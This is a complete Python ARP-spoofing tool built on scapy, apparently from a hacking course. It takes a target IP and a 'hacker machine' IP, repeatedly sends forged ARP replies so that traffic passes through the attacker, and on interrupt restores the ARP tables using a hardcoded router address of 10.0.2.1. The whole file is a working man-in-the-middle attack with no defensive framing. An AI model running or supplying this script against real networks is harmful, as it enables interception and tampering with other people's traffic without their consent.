#!/usr/bin/env python

import scapy.all as scapy
import optparse
import time
import sys

def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-t", "--target", dest="target_ip", help="Target IP")
    parser.add_option("-s", "--spoof", dest="spoof_ip", help="IP of hacker Machine")
    (options, arguments) = (parser).parse_args()
    if not options.target_ip:
        parser.error("[-] Enter Target IP, Check --help for more details.")
    elif not options.spoof_ip:
        parser.error("[-] Enter IP of hacker machine, check --help for more details.")
    else:
        return options


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc



def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    spoof_mac = get_mac(spoof_ip)
    packet_to_target = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    packet_to_router = scapy.ARP(pdst=spoof_ip, hwdst=spoof_mac, psrc=target_ip)
    scapy.send(packet_to_target, verbose=False)
    scapy.send(packet_to_router, verbose=False)

def restore(dest_ip, src_ip):
    dest_mac = get_mac(dest_ip)
    src_mac = get_mac(src_ip)
    packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=src_ip, hwsrc=src_mac)
    scapy.send(packet, count=4, verbose=False)

options = get_arguments()

sent = 0
try:
    while True :
        spoof(options.target_ip, options.spoof_ip)
        sent += 2
        print("\r [+] Packets Sent = " + str(sent)),
        sys.stdout.flush()
        time.sleep(2)

except KeyboardInterrupt:
    print("[+] Detected Ctrl+C, Terminating Program and Resetting ARP Tables.....Please Wait")
    restore(options.target_ip, "10.0.2.1")
    restore("10.0.2.1", options.target_ip)
    print("[+] Exiting....")